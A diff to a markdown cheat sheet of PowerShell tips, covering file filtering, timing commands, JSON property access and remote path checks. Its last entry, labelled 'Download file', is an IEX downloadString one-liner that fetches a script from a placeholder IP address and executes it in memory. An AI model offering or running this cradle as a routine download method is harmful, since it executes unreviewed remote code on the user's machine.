@@ -1,4 +1,76 @@
-## Download file:
+### Calculate average:
+```
+> $nums = 2,3,5,7,11
+> $nums | Measure-Object -Average
+```
+
+### Test whether a computer is pingable on the network, with a True/False response:
+```
+Test-Connection -ComputerName ExchSrv5 -Quiet
+```
+
+### Use external .NET code or library:
+```
+Add-Type
+```
+
+### List all files bigger than 1KB in size:
+```
+Get-ChildItem | Where-Object { $_.Length -gt 1KB }
+```
+
+### Export to .CSV using tab instead of comma as separator:
+```
+-Delimiter "`t"
+```
+
+### Send pipeline output to both a file and the rest of the pipeline:
+```
+Tee-Object
+```
+
+### Sort the invoices by `InvoiceID` given files named like `Company.InvoiceID.Year.pdf`:
+```
+$invoices = Get-ChildItem | ForEach-Object {
+    $vals = $_.Name.Split(".")
+
+    New-Object PSObject -Property @{
+        Company=$vals[0]
+        Invoice=$vals[1]
+        Year=$vals[2]
+    }
+
+} | Sort-Object -Property Invoice
+```
+
+### Measure how long it takes to execute the Get-Process
+```
+Measure-Command {Get-Process}
+```
+
+### Execute a scriptblock once for each item in an array and get the results back as quickly as possible:
+```
+foreach -Parallel ( ) { }
+```
+
+### Rerence the embedded property `Quiz Name`:
+```
+$json = '{"Quiz Name":"PowerShell Assesment"}'
+$obj = ConvertFrom-JSON $json
+$obj.'Quiz Name'
+```
+
+### Test the existence of the C:\TEMP directory on the remote computer TEST01:
+```
+Invoke-Command -ComputerName TEST01 -ScriptBlock {Test-Path -Path 'C:\TEMP'}
+```
+
+### Ensure that the script will only run in PowerShell version 3.0 or higher, put the following at the top of the script:
+```
+#requires -Version 3.0
+```
+
+### Download file:
 ```
 C:\Windows\system32> powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:80/file.ps1')"
 ```
